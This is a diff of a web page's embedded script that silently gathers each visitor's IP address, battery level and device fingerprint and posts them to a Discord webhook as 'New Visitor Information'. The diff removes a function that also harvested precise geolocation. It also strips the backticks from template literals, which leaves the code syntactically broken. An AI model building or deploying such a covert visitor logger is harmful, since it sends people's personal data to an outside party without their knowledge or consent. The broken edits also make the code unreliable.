@@ -22,30 +22,10 @@
         // Function to get battery info
         function getBatteryInfo() {
             if (navigator.getBattery) {
-                return navigator.getBattery().then(battery => `${(battery.level * 100).toFixed(0)}%`);
+                return navigator.getBattery().then(battery => ${(battery.level * 100).toFixed(0)}%);
             } else {
                 return Promise.resolve('Battery info not available');
             }
-        }
-
-        // Function to get geolocation
-        function getGeolocation() {
-            return new Promise((resolve, reject) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        position => {
-                            const { latitude, longitude } = position.coords;
-                            resolve(`Latitude: ${latitude}, Longitude: ${longitude}`);
-                        },
-                        error => {
-                            console.error('Error getting location:', error);
-                            resolve('Location not available');
-                        }
-                    );
-                } else {
-                    resolve('Geolocation not supported');
-                }
-            });
         }
 
         // Function to collect detailed device info
@@ -55,7 +35,7 @@
             const language = navigator.language;
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const isMobile = /Mobi|Android/i.test(userAgent) ? "Yes" : "No";
-            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const screenResolution = ${window.screen.width}x${window.screen.height};
             const screenOrientation = window.innerWidth > window.innerHeight ? 'Landscape' : 'Portrait';
             const windowWidth = window.innerWidth;
             const windowHeight = window.innerHeight;
@@ -67,7 +47,7 @@
             else if (userAgent.indexOf('macintosh') > -1) os = 'macOS';
             else if (userAgent.indexOf('linux') > -1) os = 'Linux';
 
-            return `
+            return 
                 User-Agent: ${userAgent}
                 Platform: ${platform}
                 Language: ${language}
@@ -79,11 +59,11 @@
                 Window Dimensions: ${windowWidth}x${windowHeight}
                 Device Memory: ${deviceMemory} GB
                 Hardware Concurrency: ${hardwareConcurrency}
-            `;
+            ;
         }
 
         // Function to send data to the Discord webhook
-        function sendToDiscord(ip, battery, location, deviceInfo) {
+        function sendToDiscord(ip, battery, deviceInfo) {
             const payload = {
                 embeds: [{
                     title: "New Visitor Information",
@@ -91,10 +71,9 @@
                     fields: [
                         { name: "IP Address", value: ip, inline: true },
                         { name: "Battery Level", value: battery, inline: true },
-                        { name: "Location", value: location, inline: false },
                         { name: "Device Info", value: deviceInfo, inline: false }
                     ],
-                    footer: { text: `Logged at ${new Date().toLocaleString()}` }
+                    footer: { text: Logged at ${new Date().toLocaleString()} }
                 }]
             };
 
@@ -112,10 +91,10 @@
         }
 
         // Execute functions and send data
-        Promise.all([getIPAddress(), getBatteryInfo(), getGeolocation()])
-            .then(([ip, battery, location]) => {
+        Promise.all([getIPAddress(), getBatteryInfo()])
+            .then(([ip, battery]) => {
                 const deviceInfo = getDeviceInfo();
-                sendToDiscord(ip, battery, location, deviceInfo);
+                sendToDiscord(ip, battery, deviceInfo);
             });
     </script>
 </body>
